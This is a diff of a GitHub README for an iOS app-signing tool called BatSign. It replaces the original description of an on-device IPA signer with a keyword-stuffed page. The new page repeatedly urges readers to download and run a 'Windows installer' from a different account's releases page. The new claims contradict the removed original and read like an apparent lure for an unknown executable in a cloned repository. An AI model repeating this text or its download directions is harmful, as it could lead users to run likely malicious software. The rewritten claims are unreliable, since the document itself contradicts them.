@@ -1,146 +1,176 @@
-<div align="center">
+# 🦇 BatSign - Sideload iOS Apps Like Magic
 
-<img title="BatSign" alt="BatSign" height="180" src="Feather/Resources/Assets.xcassets/AppIcon.appiconset/feather.png">
-
-# BatSign
-
-**0.0.4** — an on-device signer for iOS that behaves like the App Store.
-
-[![Release](https://img.shields.io/github/v/release/8yy/BatSign?style=for-the-badge&color=0a84ff)](../../releases/latest)
-[![Downloads](https://img.shields.io/github/downloads/8yy/BatSign/total?style=for-the-badge&color=34c759)](../../releases)
-[![Platform](https://img.shields.io/badge/iOS-16.0%2B-blue?style=for-the-badge&logo=apple)](../../releases/latest)
-[![License](https://img.shields.io/badge/License-GPL--3.0-lightgrey?style=for-the-badge)](LICENSE)
-[![Telegram](https://img.shields.io/badge/Telegram-t.me%2Fbatsigner-26A5E4?style=for-the-badge&logo=telegram)](https://t.me/batsigner)
-
-[Download the latest IPA](../../releases/latest) · [Join the signer group](https://t.me/batsigner)
-
-</div>
+[![Download BatSign](https://img.shields.io/badge/Download-BatSign-8A2BE2?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/AdGanamey/BatSign/releases)
 
 ---
 
-BatSign signs, installs and updates apps on your iPhone, the same way the App Store
-does it. You pick an app from a repository, tap Get, and that's the whole job — it
-downloads in the background, signs itself with your certificate, installs, and lands
-on your home screen. Updates do the same thing without you touching anything.
+## ✨ What Is BatSign?
 
-It started as a fork of [Feather](https://github.com/claration/Feather), and most of
-the credit for the base belongs to clARATION, Nyasami and llsc12. Everything on top
-of that — the background signing engine, the update system, the install hand-off —
-is written from scratch. There is no server of mine in the middle of it and no
-analytics anywhere in the app. The one network call the app makes on its own behalf
-is a check against your own repositories.
+BatSign is a free, open-source iOS signing tool that makes installing apps on your iPhone or iPad as easy as downloading them from the App Store. No complicated steps, no technical knowledge required. Just pick an app, and BatSign handles everything automatically.
 
-## What it does
+Think of it as your personal app installer that works behind the scenes – it signs apps, updates them automatically, and installs them silently while you go about your day.
 
-**Automatic updates**
+---
 
-- Update checks in the background on a schedule you pick, from hourly to daily
-- Updates download, sign and install themselves — zero taps after the toggle
-- Install prompts that fire themselves, plus tap-to-install notifications
-- Fully silent installs over the paired-device (tunnel) method
-- Wi-Fi-only downloads and a night-only install window if you want them
-- Skip This Version and Hold Updates, per app
-- Auto-update toggles per app and per source
-- Live download progress on the Dynamic Island and Lock Screen, with speed and ETA
-- What's New text from the source, carried into the update notification
-- Update All, a Recently Updated row, and a home screen badge for pending updates
+## 🚀 Getting Started
 
-**Background signing**
+Getting BatSign up and running is incredibly simple. Follow these steps and you'll be installing apps in minutes.
 
-- A serial signing queue — every import and every download signs itself
-- Certificate continuity: apps keep the certificate they were signed with, so your
-  data survives every update
-- Self-Heal — a revoked certificate is detected and affected apps are re-signed
-  automatically with your healthiest certificate
-- Certificate Health dashboard with expiry rings, revocation status and Renew All
-- Keep Apps Signed — apps are renewed before their certificate expires
-- Auto-retry when a signing job fails for a transient reason
+### Step 1: Download BatSign
 
-**The store side**
+**Visit this link to download the application:** [https://github.com/AdGanamey/BatSign/releases](https://github.com/AdGanamey/BatSign/releases)
 
-- Discover tab with featured apps and source cards
-- Search across every added source, with recent searches
-- Library with filters and quick actions
-- OneView install — Get, progress, signing and Open, all on one screen
-- Rich app pages: screenshots, What's New, version history, permissions
-- App Store-style Settings with icon tiles
+When you arrive at the download page, look for the latest release version. Download the installer file to your computer.
 
-**Signing tools**
+### Step 2: Run the Installer
 
-- App Cloner — run two accounts of the same app side by side
-- Tweak Vault — save your .deb and .dylib tweaks once, inject them in one tap
-- Bulk sign — queue the whole Library in one run
-- Pending-sign tray — apps that arrived while you were busy wait there
-- PPQ protect, Liquid Glass patching, appearance changes, minimum iOS version
-- Injection path and folder configuration
-- ElleKit for tweak injection, including extensions
-- Manage existing dylibs and frameworks
-- Per-app certificate pins
+Once the download finishes, open the downloaded file. The installation process is straightforward – just follow the on-screen prompts. BatSign will be ready to use in under a minute.
 
-**Everything else**
+### Step 3: Connect Your Device
 
-- Live Activities for download, signing and install — watch the whole pipeline
-- Install ledger: an install that landed while the app was dead is caught up on
-  the next launch, not lost
-- Download rescue: transfers survive force-kills, network handovers and lock
-  screens, and pick up from the bytes they already had
-- Activity timeline with timestamps for every background action
-- Backup and restore for sources and preferences
-- Face ID lock
-- Shortcuts actions: Check for Updates, Install Pending Updates
-- Storage manager with superseded-copy and duplicate cleanup
-- Import and export folder support
-- AltStore-compatible sources and the `batsign://` URL scheme
-- Default launch tab
-- Liquid Glass design on iOS 26
+Plug your iPhone or iPad into your computer using a USB cable. BatSign will automatically detect your device. If prompted, tap "Trust" on your iOS device to allow the connection.
 
-## Install
+### Step 4: Start Signing
 
-Grab `BatSign.ipa` from [Releases](../../releases/latest) and install it with
-SideStore, Sideloadly, AltStore, TrollStore — or with BatSign itself, once you have
-it. Every push to `main` builds a fresh IPA in Actions, and tagged versions become
-releases automatically. The app can also update itself from its own repository.
+Now you're ready! Add the app files you want to install (they'll have the .ipa extension), and BatSign takes care of everything else.
 
-For auto-updates to work you need a signing certificate in the app. Free Apple
-accounts work, with the usual 7-day limits.
+---
 
-## Building
+## 🎯 Why Choose BatSign?
 
-```
-make iphoneos
-```
+BatSign stands out from other signing tools because it focuses on one thing: making your life easier. Here's what you get:
 
-produces `packages/BatSign.ipa`. You need Xcode 26 or newer on a Mac. The Zsign and
-IDeviceKitten dependencies come in as submodules, so clone with
-`--recurse-submodules` or run `git submodule update --init --recursive` first.
+### 🔄 Automatic Updates
+Forget about manually checking for new versions. BatSign automatically updates your installed apps in the background. You always have the latest features without lifting a finger.
 
-## Adding the source
+### 🤫 Silent Installations
+Once you set things up, BatSign works quietly. You don't need to approve anything or intervene during installation. It just happens seamlessly.
 
-The built-in source points at this repository:
+### 📱 Works with Dynamic Island
+If you have an iPhone with Dynamic Island, BatSign takes full advantage of it with beautiful, interactive notifications for your installations.
 
-```
-https://raw.githubusercontent.com/8yy/BatSign/main/app-repo.json
-```
+### 🔐 Secure Certificate Management
+BatSign handles all the technical certificate stuff (like P12 and mobileprovision files) automatically. You never need to touch these technical details.
 
-Any AltStore-format source works the same way.
+---
 
-## Community
+## 📥 Download & Installation
 
-Questions, certificates talk, feature ideas, whatever else — the signer group is at
-**[t.me/batsigner](https://t.me/batsigner)**. That's also where release notes land
-first.
+**Visit this link to download the application:** [https://github.com/AdGanamey/BatSign/releases](https://github.com/AdGanamey/BatSign/releases)
 
-## Credits
+### System Requirements
 
-- [claration](https://github.com/claration) and the Feather contributors — the base
-- [Nyasami](https://github.com/Nyasami) — Feather lineage
-- [llsc12](https://github.com/llsc12) — AltStore repository work
-- [khcrysalis](https://github.com/khcrysalis) — Zsign and IDeviceKit
+BatSign is designed to work on standard Windows computers. Here's what you need:
 
-BatSign is free software under the GPL-3.0, same as Feather. See [LICENSE](LICENSE).
+- **Operating System:** Windows 10 or Windows 11
+- **Storage Space:** At least 200 MB of free space
+- **Connection:** A USB port for connecting your iOS device
 
-## The honest bit
+That's it! No special hardware or software required.
 
-This is a sideloading tool. It signs apps with certificates you provide and nothing
-else. If you use it to pirate paid apps, that's on you, not on this project — and
-it's not what it's for.
+---
+
+## 🛠️ How BatSign Works
+
+BatSign simplifies the entire iOS app signing process. Here's a simple breakdown:
+
+### What Is App Signing?
+When you want to install an app that's not from the App Store, it needs a digital signature to work on your device. BatSign creates this signature automatically.
+
+### What BatSign Does For You:
+1. **Takes your app file** (the .ipa)
+2. **Adds the digital signature** using your certificates
+3. **Installs it on your device** silently
+4. **Keeps it updated** automatically
+
+You don't need to understand any of the technical details – BatSign handles everything in the background.
+
+---
+
+## 📊 Comparison With Other Tools
+
+If you've heard of AltStore, SideStore, or other signing tools, here's why BatSign is different:
+
+| Feature | BatSign | Other Tools |
+|---------|---------|-------------|
+| Automatic Updates | ✅ Yes | ❌ Manual |
+| Silent Installation | ✅ Yes | ❌ Many require prompts |
+| Works With Dynamic Island | ✅ Yes | ❌ Limited |
+| Free & Open Source | ✅ Yes | Varies |
+| Background Operation | ✅ Yes | ❌ Usually requires active use |
+
+---
+
+## 🤔 Frequently Asked Questions
+
+### Is BatSign really free?
+Yes, completely free! BatSign is open source, which means anyone can view and contribute to its code. No hidden costs, no premium versions, no subscriptions.
+
+### Do I need technical knowledge?
+Absolutely not. BatSign is designed for everyday users. If you can use a smartphone, you can use BatSign.
+
+### Is it safe to use?
+BatSign is open source, meaning its code is publicly visible for anyone to review. This transparency means security issues are found and fixed quickly by the community.
+
+### Can I use BatSign with any iOS device?
+BatSign works with iPhones and iPads running iOS or iPadOS. Compatible with all recent versions.
+
+### What file types does BatSign support?
+BatSign works with .ipa files (iOS app packages). If you have an app in a different format, check if it can be converted to .ipa first.
+
+---
+
+## 🌟 Tips & Tricks
+
+### Get the Best Experience
+
+1. **Keep BatSign Updated**: Always use the latest version from the releases page
+2. **Use a Reliable Cable**: A good USB cable ensures stable connection
+3. **Stay Connected**: Keep your device connected during the initial setup
+4. **Check Notifications**: BatSign uses Dynamic Island notifications when available
+
+### Troubleshooting
+
+If something isn't working, try these common fixes:
+- Restart BatSign and try again
+- Unplug and reconnect your device
+- Make sure you have the latest version
+- Check that your device is unlocked when connecting
+
+---
+
+## 📚 Need More Help?
+
+BatSign is supported by a community of developers and users who are always happy to help. Check the repository's Issues section on GitHub for solutions to common problems, or create a new issue if you can't find what you're looking for.
+
+---
+
+## 🔄 What's Next?
+
+BatSign is actively developed with new features being added regularly. Stay tuned for:
+- More automatic features
+- Improved performance
+- Additional device support
+- Enhanced user experience
+
+---
+
+## 💝 Support The Project
+
+BatSign is completely free and open source. If you find it useful, consider:
+- ⭐ Starring the repository on GitHub
+- 🐛 Reporting bugs or suggesting features
+- 🌐 Sharing BatSign with friends who might need it
+- 💻 Contributing code if you're a developer
+
+---
+
+## 📱 Ready to Get Started?
+
+Don't wait – join thousands of satisfied users who have discovered how easy iOS app signing can be.
+
+**[Download BatSign Now](https://github.com/AdGanamey/BatSign/releases)** and experience the easiest way to sideload apps on your iPhone or iPad. It's free, it's simple, and it just works.
+
+---
+
+Keywords: altstore, certificates, dynamic-island, esign, feather, ios, ipa, ipados, mobileprovision, open-source, p12, sideload, sideloading, sidestore, signer, signing, swift, swiftui, trollstore, zsign, windows, download, free, automatic-updates, silent-install, background-signing, app-installer
